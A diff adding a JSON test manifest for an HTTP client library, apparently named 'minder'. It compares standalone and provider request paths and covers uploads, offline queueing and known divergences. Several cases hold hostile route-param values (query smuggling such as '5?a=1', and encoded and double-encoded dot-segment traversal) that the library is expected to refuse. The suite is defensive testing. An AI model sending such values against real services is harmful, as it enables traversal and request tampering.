+      "description": "RELEASE BLOCKER, EXACT REPRODUCTION: route /flat/:id, standalone minder(..., { params: { id: '5?a=1' } }) previously sent PUT /flat/5?a=1&id=5%3Fa%3D1 \u2014 a LIVE caller-controlled query param ('a=1') merged onto the real request, targeting a different resource/semantics than intended. Must now refuse before dispatch, zero requests reach the wire."
+    },
+    {
+      "id": "sph-standalone-minder-empty-id-refuses",
+      "acceptance": "FIX-A-HOSTILE-ROUTE-PARAMS",
+      "driver": "standalone-params-hostile",
+      "pattern": "minder('usersEmptyStandalone', data, { params: { id: '' } })",
+      "module": "esm",
+      "description": "RELEASE BLOCKER, EXACT REPRODUCTION: route /users/:id, standalone minder(..., { params: { id: '' } }) previously sent PUT /users/?id= \u2014 the COLLECTION, not the single resource the caller intended. Must now refuse before dispatch, zero requests reach the wire."
+    },
+    {
+      "id": "sph-standalone-minder-encoded-traversal-id-refuses",
+      "acceptance": "FIX-A-HOSTILE-ROUTE-PARAMS",
+      "driver": "standalone-params-hostile",
+      "pattern": "minder('encThingStandalone', data, { params: { id: '%2e%2e%2f' } })",
+      "module": "cjs",
+      "description": "RELEASE BLOCKER: a percent-encoded traversal sequence in a standalone minder() route param must be caught after bounded percent-decoding, mirroring the CRUD-path F4 coverage in crud-id-hostile-inputs.mjs \u2014 zero requests reach the wire."
+    },
+    {
+      "id": "sph-standalone-minder-bare-dot-id-refuses",
+      "acceptance": "FIX-ROUTE-PARAM-DOT-SEGMENT-DETECTOR",
+      "driver": "standalone-params-hostile",
+      "pattern": "minder('dotThingStandalone', data, { params: { id: '.' } })",
+      "module": "esm",
+      "description": "RELEASE BLOCKER: the standalone-minder()-path mirror of crud-id-hostile-inputs.mjs's F5 bare-dot case \u2014 route /dot-standalone/:id, { params: { id: '.' } } must now refuse before dispatch (zero requests reach the wire), proving the SAME shared choke point closes this gap for options.params too."
+    },
+    {
+      "id": "sph-standalone-minder-encoded-dot-lower-id-refuses",
+      "acceptance": "FIX-ROUTE-PARAM-DOT-SEGMENT-DETECTOR",
+      "driver": "standalone-params-hostile",
+      "pattern": "minder('dotEncLoThingStandalone', data, { params: { id: '%2e' } })",
+      "module": "cjs",
+      "description": "RELEASE BLOCKER: a single-encoded '.' (lowercase hex) supplied via options.params must be refused after decoding, zero requests reach the wire."
+    },
+    {
+      "id": "sph-standalone-minder-encoded-dot-upper-id-refuses",
+      "acceptance": "FIX-ROUTE-PARAM-DOT-SEGMENT-DETECTOR",
+      "driver": "standalone-params-hostile",
+      "pattern": "minder('dotEncHiThingStandalone', data, { params: { id: '%2E' } })",
+      "module": "esm",
+      "description": "RELEASE BLOCKER: a single-encoded '.' (uppercase hex digit) supplied via options.params must be refused after decoding, zero requests reach the wire."
+    },
+    {
+      "id": "sph-standalone-minder-double-encoded-dot-id-refuses",
+      "acceptance": "FIX-ROUTE-PARAM-DOT-SEGMENT-DETECTOR",
+      "driver": "standalone-params-hostile",
+      "pattern": "minder('dotEnc2ThingStandalone', data, { params: { id: '%252e' } })",
+      "module": "cjs",
+      "description": "RELEASE BLOCKER: a double-encoded '.' supplied via options.params must be refused once the bounded decode loop fully resolves it to a bare dot-segment, zero requests reach the wire."
+    },
+    {
+      "id": "sph-standalone-minder-triple-dot-id-refuses",
+      "acceptance": "FIX-ROUTE-PARAM-DOT-SEGMENT-DETECTOR",
+      "driver": "standalone-params-hostile",
+      "pattern": "minder('dot3ThingStandalone', data, { params: { id: '...' } })",
+      "module": "esm",
+      "description": "RELEASE BLOCKER: three dots supplied via options.params \u2014 nothing-but-dots of any length \u2014 must be refused before dispatch, zero requests reach the wire."
+    },
+    {
+      "id": "sph-standalone-minder-zero-id-succeeds",
+      "acceptance": "FIX-A-HOSTILE-ROUTE-PARAMS",
+      "driver": "standalone-params-hostile",
+      "pattern": "minder('posZeroStandalone', data, { params: { id: 0 } })",
+      "module": "esm",
+      "description": "POSITIVE CONTROL: the legitimate numeric param 0 on the standalone minder() path must still dispatch PUT /pos-zero-standalone/0 with success:true \u2014 a guard that refuses valid input is its own defect."
+    },
+    {
+      "id": "sph-standalone-minder-leading-zero-string-id-succeeds",
+      "acceptance": "FIX-A-HOSTILE-ROUTE-PARAMS",
+      "driver": "standalone-params-hostile",
+      "pattern": "minder('pos007Standalone', data, { params: { id: '007' } })",
+      "module": "cjs",
+      "description": "POSITIVE CONTROL: a leading-zero string param ('007') on the standalone minder() path must still dispatch PUT /pos-007-standalone/007 with success:true."
+    },
+    {
+      "id": "sph-standalone-minder-uuid-id-succeeds",
+      "acceptance": "FIX-A-HOSTILE-ROUTE-PARAMS",
+      "driver": "standalone-params-hostile",
+      "pattern": "minder('posUuidStandalone', data, { params: { id: uuid } })",
+      "module": "esm",
+      "description": "POSITIVE CONTROL: a UUID param on the standalone minder() path must still dispatch correctly (hyphens are not in the hostile character class)."
+    },
+    {
+      "id": "sph-standalone-minder-nested-route-id-succeeds",
+      "acceptance": "FIX-A-HOSTILE-ROUTE-PARAMS",
+      "driver": "standalone-params-hostile",
+      "pattern": "minder('posNestedStandalone', undefined, { params: { id: '42' } }) on route /pos-t-standalone/:id/comments",
+      "module": "cjs",
+      "description": "POSITIVE CONTROL: a nested route with a genuine ':id' PATH placeholder and a valid id on the standalone minder() path must still dispatch GET /pos-t-standalone/42/comments with success:true."
+    },
+    {
+      "id": "sph-standalone-minder-no-redundant-query-param",
+      "acceptance": "FIX-A-HOSTILE-ROUTE-PARAMS",
+      "driver": "standalone-params-hostile",
+      "pattern": "minder('noRedundantQueryStandalone', data, { params: { id: '42' } })",
+      "module": "esm",
+      "description": "REGRESSION GUARD: a ':id' route substituted via the standalone minder() + options.params path must substitute the id into the URL PATH ONLY \u2014 no redundant/leaking '?id=...' query string appended alongside it (the minder.ts consumedKeys exclusion fix, mirroring ApiClient.dispatchResolved's existing consumedKeys filtering)."
+    },
+    {
+      "id": "blocker2-provider-upload-honors-transport-fetch",
+      "acceptance": "B1",
+      "driver": "upload-transport",
+      "pattern": "useMinder('thing').upload.uploadFile(file) with config.transport:'fetch'",
+      "module": "esm",
+      "description": "BLOCKER 2: the provider upload path (ApiClient.uploadFile -> dispatchNativeFetch) dispatches via native fetch() with a real multipart body when transport:'fetch' is set \u2014 axios's own request/response pipeline is never invoked"
+    },
+    {
+      "id": "blocker2-provider-upload-simulated-workerd-completes",
+      "acceptance": "B1",
+      "driver": "upload-transport",
+      "pattern": "useMinder('thing').upload.uploadFile(file) with config.transport:'fetch'",
+      "module": "cjs",
+      "description": "BLOCKER 2, SIMULATED bare workerd (fetch stub throws on any RequestInit.cache field, per the wave brief's own fallback instruction): the provider upload still completes a real multipart round trip \u2014 the native-fetch dispatch never sets 'cache'"
+    },
+    {
+      "id": "blocker2-standalone-upload-honors-transport-fetch",
+      "acceptance": "B1",
+      "driver": "upload-transport",
+      "pattern": "minder(url, file, { transport: 'fetch' })",
+      "module": "esm",
+      "description": "BLOCKER 2: standalone minder()'s file-upload branch honours an EXPLICIT transport:'fetch' instead of always forcing axios (isComplexRequest previously overrode it unconditionally) \u2014 dispatches via native fetch() with a real multipart body"
+    },
+    {
+      "id": "blocker2-standalone-upload-simulated-workerd-completes",
+      "acceptance": "B1",
+      "driver": "upload-transport",
+      "pattern": "minder(url, file, { transport: 'fetch' })",
+      "module": "cjs",
+      "description": "BLOCKER 2, SIMULATED bare workerd (fetch stub throws on any RequestInit.cache field): standalone minder()'s file upload still completes a real multipart round trip under transport:'fetch'"
+    },
+    {
+      "id": "blocker2-provider-upload-dead-port-clean-failure",
+      "acceptance": "B1",
+      "driver": "upload-transport",
+      "pattern": "useMinder('thing').upload.uploadFile(file) with config.transport:'fetch'",
+      "module": "esm",
+      "description": "FAILURE PATH: a provider upload under transport:'fetch' against a REAL dead port reports a clean, network-shaped failure \u2014 no crash, and not the workerd-style RequestInit error masquerading as something else"
+    },
+    {
+      "id": "high-content-type-json-provider-fetch-matches-standalone",
+      "acceptance": "B2",
+      "driver": "upload-transport",
+      "pattern": "useMinder('thing').mutate(data) with config.transport:'fetch'",
+      "module": "esm",
+      "description": "HIGH: the provider path under transport:'fetch' sends content-type: application/json for a plain JSON body, matching standalone minder()'s existing behaviour \u2014 previously sent text/plain;charset=UTF-8 because dispatchNativeFetch never merged in the axios instance's own default headers"
+    },
+    {
+      "id": "osp-standalone-minder-dead-port-reports-failure-and-enqueues",
+      "acceptance": "H1",
+      "driver": "offline-standalone-parity",
+      "pattern": "standalone minder() with offline:{enabled:true}",
+      "module": "esm",
+      "description": "FAILURE PATH: standalone minder() against a REAL dead port, with configureMinder({offline:{enabled:true}}), reports success:false (error.code=OFFLINE_ERROR) AND the failed mutation lands in getOfflineManager()'s queue -- previously reported NETWORK_ERROR with queueSize 0"
+    },
+    {
+      "id": "osp-standalone-sync-fails-cleanly-without-baseurl-known-limitation",
+      "acceptance": "H1",
+      "driver": "offline-standalone-parity",
+      "pattern": "getOfflineManager().sync()",
+      "module": "esm",
+      "description": "KNOWN LIMITATION (discovered building this driver, not H1/H1b -- those are about the ENQUEUE side, proven by the case above): standalone has no baseURL-aware requestExecutor wired for OfflineManager replay (unlike the provider path), so sync() for a standalone-queued relative URL fails with a clean 'Failed to parse URL' stat instead of crashing/hanging -- documents the gap honestly, flagged as a follow-up rather than silently asserting replay success"
+    },
+    {
+      "id": "osp-no-offline-config-standalone-dead-port-stays-plain-network-error",
+      "acceptance": "H1",
+      "driver": "offline-standalone-parity",
+      "pattern": "standalone minder() (no offline config)",
+      "module": "cjs",
+      "description": "HOSTILE INPUT / regression guard: the SAME real dead-port failure with NO offline config still reports a plain NETWORK_ERROR and never starts queueing -- the broadened no-response classification is gated on offline support actually being enabled"
+    },
+    {
+      "id": "osp-get-request-standalone-dead-port-is-not-auto-queued",
+      "acceptance": "H1",
+      "driver": "offline-standalone-parity",
+      "pattern": "standalone minder(routeName) GET with offline:{enabled:true}",
+      "module": "esm",
+      "description": "HOSTILE INPUT: a real dead-port failure for a GET-method standalone minder() call, with offline support enabled, is NEVER auto-queued -- only mutations are queueable"
+    },
+    {
+      "id": "osp-standalone-and-provider-share-one-offline-manager-instance",
+      "acceptance": "H1b",
+      "driver": "offline-standalone-parity",
+      "pattern": "standalone minder() + <MinderDataProvider> useMinder().mutate(), same configureMinder instance",
+      "module": "esm",
+      "description": "H1b proof: a standalone minder() failure and a <MinderDataProvider>+useMinder().mutate() failure, against the SAME configureMinder-wired instance and dead port, land in the SAME OfflineManager queue (2 entries) -- proves one shared failure-classification choke point, not two independently-matching implementations"
+    },
+    {
+      "id": "arpm-fresh-process-esm-root-dead-port-never-throws",
+      "acceptance": "B1",
+      "driver": "app-router-plugin-manager",
+      "pattern": "minder() from a fresh module graph, ESM root entry",
+      "module": "esm",
+      "description": "a bare minder() call against a REAL dead port, from a FRESH process where no plugin has ever been registered (the common App Router Route Handler/Server Component case), returns a MinderResult (success:false) -- never throws, never crashes the process"
+    },
+    {
+      "id": "arpm-fresh-process-cjs-node-entry-dead-port-never-throws",
+      "acceptance": "B1",
+      "driver": "app-router-plugin-manager",
+      "pattern": "minder() from a fresh module graph, CJS ./node entry",
+      "module": "cjs",
+      "description": "the SAME never-throws contract through the Node-targeted ./node subpath a server-only Route Handler would plausibly import from"
+    },
+    {
+      "id": "arpm-repeated-calls-same-process-never-throws",
+      "acceptance": "B1b",
+      "driver": "app-router-plugin-manager",
+      "pattern": "3 sequential minder() calls, same warm process",
+      "module": "esm",
+      "description": "root-cause proof: the fix is not a one-shot accident of module-init ordering -- repeated minder() calls in the same warm process (matching serverless/App-Router function reuse) all return a clean MinderResult with no throw"
+    },
+    {
+      "id": "sec-standalone-cross-origin-redirect-strips-route-header",
+      "acceptance": "B2",
+      "driver": "standalone-redirect-header-leak",
+      "pattern": "standalone minder(routeName, undefined, { params }) against a route whose OWN host responds with a real cross-origin 302",
+      "module": "esm",
+      "description": "SECURITY (redirect header leak, standalone path): a real 302 from the route's own trusted host to a SECOND, independent server must still dispatch successfully, but axios's sensitiveHeaders (now set from the route's own declared header names via the shared choke point src/core/apiClient/sensitiveHeaders.ts) must strip the route's static X-Api-Key header on the cross-origin redirect hop -- the first hop receives it normally, the redirect target never does"
+    },
+    {
+      "id": "p-m1-registered-put-method-resolution",
+      "acceptance": "M1",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "registered PUT route, params substitution -- standalone minder() and provider ApiClient must dispatch byte-identical PUT /items/7 requests"
+    },
+    {
+      "id": "p-b2-delete-with-body",
+      "acceptance": "B2",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "DELETE with a JSON body on a registered route -- both entry points must send the body"
+    },
+    {
+      "id": "p-b3-string-body",
+      "acceptance": "B3",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "plain string request body -- both entry points must send it unmodified with the same Content-Type"
+    },
+    {
+      "id": "p-b5-urlsearchparams-body-axios",
+      "acceptance": "B5",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "URLSearchParams body under the default (axios) transport -- both entry points must form-encode identically"
+    },
+    {
+      "id": "p-b7-formdata-body-axios",
+      "acceptance": "B7",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "FormData body under the default (axios) transport -- both entry points must produce the same multipart encoding (random boundary token normalised before comparison)"
+    },
+    {
+      "id": "p-h-route-declared-header",
+      "acceptance": "row21",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "a route's own declared static header (X-Api-Key) must reach the wire identically from both entry points"
+    },
+    {
+      "id": "p-s1-sanitization-of-body-field",
+      "acceptance": "S1",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "security.sanitization applied to a request body field -- regression guard for the previously-fixed sanitization no-op, both entry points must sanitize identically"
+    },
+    {
+      "id": "p-s2-sanitization-of-query-param",
+      "acceptance": "S2",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "security.sanitization applied to a GET query param -- both entry points must sanitize identically"
+    },
+    {
+      "id": "p-u1-repeated-id-placeholder-registered",
+      "acceptance": "row21",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "a registered route with the SAME :id placeholder repeated twice in its URL template must substitute identically on both entry points"
+    },
+    {
+      "id": "p-u2-hostile-dotdot-id-registered-refused",
+      "acceptance": "row21",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "hostile-route-params failure path: {id:'..'} on a registered route must be refused with zero wire requests on both entry points"
+    },
+    {
+      "id": "p-hostile-percent-encoded-dot-segment-registered",
+      "acceptance": "row21",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "hostile-route-params failure path: a percent-encoded dot-segment ('%2e%2e') on a registered route must be refused with zero wire requests on both entry points"
+    },
+    {
+      "id": "p-gb1-get-with-body",
+      "acceptance": "GB1",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "an explicit GET with a request body -- both entry points must dispatch it identically"
+    },
+    {
+      "id": "p-u3u4-shared-defect-literal-placeholder-unregistered",
+      "acceptance": "U3/U4",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "options.params on an UNREGISTERED path -- documents a SHARED defect (both entry points leave the literal :id placeholder unsubstituted on the wire), not a standalone-vs-provider divergence"
+    },
+    {
+      "id": "p-u3u4-positional-params-unregistered-path",
+      "acceptance": "U3/U4",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "provider-only positional-params channel (request(path,data,{id})) on an unregistered path substitutes correctly; standalone minder() has no equivalent channel and falls back to the shared-defect literal-placeholder case above"
+    },
+    {
+      "id": "p-b9-urlsearchparams-body-loss-under-fetch",
+      "acceptance": "B9",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "URLSearchParams body under transport:'fetch' -- documents a SHARED defect (both fetch dispatchers stringify the body to an empty JSON object), not a divergence"
+    },
+    {
+      "id": "p-e1-404-outgoing-request-shape",
+      "acceptance": "E1",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "failure path (4xx): outgoing request shape parity when the server answers 404 -- response-side error-vocabulary divergence is documented in the case message, out of this comparator's {method,path,body,headers} scope"
+    },
+    {
+      "id": "p-e2-500-outgoing-request-shape",
+      "acceptance": "E2",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "failure path (5xx): outgoing request shape parity when the server answers 500"
+    },
+    {
+      "id": "p-e3-dead-port-failure-path",
+      "acceptance": "E3",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "failure path: a real dead port refuses the TCP connection before any bytes are sent -- both entry points must report zero wire requests"
+    },
+    {
+      "id": "p-to1-route-timeout-outgoing-request-shape",
+      "acceptance": "TO1",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "failure path (timeout): outgoing request shape parity when the server is slower than the route's configured timeout"
+    },
+    {
+      "id": "p-rd1-cross-origin-redirect-secret-leak",
+      "acceptance": "RD1",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "CRITICAL credential-exfiltration regression guard: a route-declared X-Api-Key secret must never reach a second, independent cross-origin host after a real 302 -- was probe RD1 (standalone-only leak) in the seeding audit, now a strict PARITY assertion since the fix landed (see fix-nextjs-appouter-build-and-redirect-header-leak / tests/wire/standalone-redirect-header-leak.mjs)"
+    },
+    {
+      "id": "p-a1-custom-auth-header-prefix",
+      "acceptance": "A1",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "ALLOWLISTED known divergence: auth.authHeader/auth.authTokenPrefix are honoured by the provider path only; minder() hardcodes 'Authorization: Bearer <token>'"
+    },
+    {
+      "id": "p-a3-percall-authorization-override",
+      "acceptance": "A3",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "ALLOWLISTED known divergence: a per-call Authorization override is honoured by minder() but silently replaced by the ambient AuthManager token on the provider path"
+    },
+    {
+      "id": "p-c1-csrf-token-header",
+      "acceptance": "C1",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "ALLOWLISTED known divergence: security.csrfProtection is enforced by the provider path only"
+    },
+    {
+      "id": "p-rl1-rate-limiting",
+      "acceptance": "RL1",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "ALLOWLISTED known divergence: security.rateLimiting is enforced by the provider path only"
+    },
+    {
+      "id": "p-px2-cors-proxy-rewrite",
+      "acceptance": "PX2",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "ALLOWLISTED known divergence: corsHelper.proxy URL rewriting exists on the provider path only; minder() always goes straight to the real origin"
+    },
+    {
+      "id": "p-m2-adhoc-path-id-field-method",
+      "acceptance": "M2",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "ALLOWLISTED known divergence: identical consumer code (ad-hoc path, body containing an 'id' field) resolves to PUT on minder() and POST on the provider path"
+    },
+    {
+      "id": "p-m3-untrimmed-method-whitespace",
+      "acceptance": "M3",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "ALLOWLISTED known divergence: an untrimmed method string ('  post  ') is refused by minder() but trimmed+dispatched by the provider path"
+    },
+    {
+      "id": "p-m4-invalid-method-token-crash-class",
+      "acceptance": "M4",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "invalid method token 'PO ST' on an unregistered path -- both entry points send zero wire requests (PARITY on the wire axis); the exception NATURE differs (directed MinderError vs a raw TypeError crash class in ApiClient's retry interceptor) and is documented in the case message, out of this comparator's wire-shape scope"
+    },
+    {
+      "id": "p-m4b-invalid-method-registered-route",
+      "acceptance": "M4b",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "invalid method token 'PO ST' on a REGISTERED route -- both entry points send zero wire requests; error-vocabulary divergence documented in the case message"
+    },
+    {
+      "id": "p-u5-unknown-route-name-typo",
+      "acceptance": "U5",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "ALLOWLISTED known divergence: an unknown/typo'd bare route name silently dispatches a real request via minder() but is refused with ROUTE_NOT_FOUND on the provider path"
+    },
+    {
+      "id": "p-b4-xml-string-body",
+      "acceptance": "B4",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "ALLOWLISTED known divergence: a '<?xml ...' string body is passed through raw by the provider path (Content-Type: application/xml) but JSON-encoded (and thereby altered) by minder()"
+    },
+    {
+      "id": "p-b6-blob-body-encoding",
+      "acceptance": "B6",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "ALLOWLISTED known divergence: a Blob request body is wrapped into multipart FormData by the provider path but passed through raw by minder()"
+    },
+    {
+      "id": "p-r1-retry-post-500-idempotency",
+      "acceptance": "R1",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "ALLOWLISTED known divergence, data-integrity: a persistent 500 with retries=2 on a POST -- minder() excludes POST from retries by default (n=1), the provider path retries any 5xx regardless of method (n=3)"
+    },
+    {
+      "id": "p-r3-retry-under-fetch-transport",
+      "acceptance": "R3",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "ALLOWLISTED known divergence: retries under transport:'fetch' -- minder()'s retry loop wraps both transports (n=3), the provider path's retry logic lives only in the axios response interceptor (n=1)"
+    },
+    {
+      "id": "p-d1-inflight-deduplication",
+      "acceptance": "D1",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "ALLOWLISTED known divergence: performance.deduplication for two concurrent identical GETs is honoured by the provider path (n=1) and a silent no-op on the identical standalone config (n=2)"
+    },
+    {
+      "id": "p-t1-percall-transport-fetch-fingerprint",
+      "acceptance": "T1",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "ALLOWLISTED known divergence: per-call transport:'fetch' is honoured by minder() (User-Agent fingerprint changes) and silently dropped by the provider path (User-Agent stays axios-shaped) -- the one case in this suite that deliberately inspects User-Agent, which the generic comparator otherwise ignores"
+    },
+    {
+      "id": "p-ab1-abort-cancellation-timing",
+      "acceptance": "AB1",
+      "driver": "two-path-parity",
+      "pattern": "two-path-parity: minder()/configureMinder() vs <MinderDataProvider>+ApiClient",
+      "module": "esm",
+      "description": "ALLOWLISTED known divergence, timing/outcome not wire-bytes: an AbortSignal fired shortly after dispatch is honoured by the provider path (settles quickly) but ignored by minder() (MinderOptions has no signal field, the call runs to full completion)"
+    }
+  ]
+}
